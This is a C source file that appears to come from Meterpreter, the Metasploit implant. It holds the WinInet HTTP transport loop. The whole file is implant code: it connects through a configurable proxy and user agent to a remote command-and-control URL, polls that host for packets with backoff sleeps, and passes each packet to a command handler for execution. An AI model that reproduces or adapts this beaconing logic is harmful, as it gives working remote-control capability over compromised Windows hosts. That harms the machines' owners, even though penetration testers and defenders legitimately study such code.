#include "metsrv.h"
#include <wininet.h>

#ifndef USE_WINHTTP

DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iExpirationTimeout, int iCommTimeout,
	wchar_t* pMetUA, wchar_t* pMetProxy, wchar_t* pMetProxyUser, wchar_t* pMetProxyPass)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;
	char tmpHostName[512];
	char tmpUrlPath[1024];

	remote->expiration_time = 0;
	if (iExpirationTimeout > 0)
	{
		remote->expiration_time = current_unix_timestamp() + iExpirationTimeout;
	}

	remote->comm_timeout = iCommTimeout;
	remote->start_time = current_unix_timestamp();
	remote->comm_last_packet = current_unix_timestamp();

	// Allocate the top-level handle
	if (!strcmp(pMetProxy, "METERPRETER_PROXY"))
	{
		remote->hInternet = InternetOpen(pMetUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}
	else
	{
		remote->hInternet = InternetOpen(pMetUA, INTERNET_OPEN_TYPE_PROXY, pMetProxy, NULL, 0);
	}

	if (!remote->hInternet)
	{
		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);

	// The InternetCrackUrl method was poorly designed...
	memset(tmpHostName, 0, sizeof(tmpHostName));
	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));

	memset(&bits, 0, sizeof(bits));
	bits.dwStructSize = sizeof(bits);
	bits.dwHostNameLength = sizeof(tmpHostName)-1;
	bits.lpszHostName = tmpHostName;
	bits.dwUrlPathLength = sizeof(tmpUrlPath)-1;
	bits.lpszUrlPath = tmpUrlPath;

	InternetCrackUrl(remote->url, 0, 0, &bits);

	remote->uri = _strdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
	dprintf("[DISPATCH] Host: %s Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	remote->hConnection = InternetConnect(remote->hInternet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!remote->hConnection)
	{
		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);

	//authentication
	if (!(strcmp(pMetProxyUser, "METERPRETER_USERNAME_PROXY") == 0))
	{
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, pMetProxyUser, (DWORD)strlen(pMetProxyUser) + 1);
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, pMetProxyPass, (DWORD)strlen(pMetProxyPass) + 1);
		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", pMetProxyUser, pMetProxyPass);
	}

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
			break;
		}

		if (event_poll(serverThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive(remote, &packet);
		if (result != ERROR_SUCCESS)
		{

			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				remote->comm_last_packet = current_unix_timestamp();
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		remote->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	// Close WinInet handles
	InternetCloseHandle(remote->hConnection);
	InternetCloseHandle(remote->hInternet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

#endif